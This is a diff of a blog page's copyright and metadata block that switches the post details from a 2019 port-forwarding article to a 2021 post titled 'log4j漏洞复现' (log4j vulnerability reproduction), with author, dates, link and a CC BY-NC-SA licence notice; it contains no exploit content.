+    <p><span class="copy-title">文章标题:</span>log4j漏洞复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-09-20, 01:58:49</p>
-    <p><span class="copy-title">最后更新:</span>2019-09-20, 01:59:50</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/1c51cbd7.html" title="内网渗透之端口转发学习">http://422926799.github.io/posts/1c51cbd7.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-12-15, 00:38:49</p>
+    <p><span class="copy-title">最后更新:</span>2021-12-15, 01:09:33</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/98d13101.html" title="log4j漏洞复现">http://422926799.github.io/posts/98d13101.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
